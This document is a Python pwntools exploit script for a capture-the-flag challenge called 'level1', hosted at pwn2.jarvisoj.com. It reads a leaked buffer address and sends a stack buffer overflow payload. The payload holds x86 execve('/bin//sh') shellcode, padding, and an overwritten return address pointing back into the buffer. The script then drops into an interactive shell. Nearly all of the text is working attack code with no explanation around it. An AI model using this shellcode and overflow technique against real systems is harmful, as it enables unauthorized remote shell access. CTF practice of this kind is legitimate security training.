#!/usr/bin/python

from pwn import *

def get_buf_addr():
    global io
    io.recvuntil('this:')
    buf_addr = int(io.recvuntil('?').strip('?'), 16)
    print(hex(buf_addr))
    return buf_addr

def exploit():
    global io
    ret_addr = get_buf_addr()
    
    shellcode  = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
    payload    = shellcode
    payload   += 'A' * (0x88-len(shellcode))
    payload   += 'A' * 0x4     # ebp
    payload   += p32(ret_addr) # ret addr
    
    io.sendline(payload)
    
    # get shell
    io.interactive()


if __name__ == '__main__':
    target_elf = './level1'
    #target_libc = './libc-2.23.so'

    target_host = 'pwn2.jarvisoj.com'
    target_port = '9877'

    #context.log_level = 'debug'
    #context.terminal = ['tmux', 'splitw', '-v']

    #gdb.attach(proc.pidof(p)[0])

    elf = ELF(target_elf)
    #libc = ELF(target_libc)

    #LOCAL = True
    LOCAL = False

    if LOCAL:
        #io = process(target_elf, env={'LD_PRELOAD':target_libc})
        io = process(target_elf)
        gdb.attach(io, '''b *0x080484AC
        #b *0x0000000000400DC8''')
    else:
        io = remote(target_host, target_port)
    
    exploit()


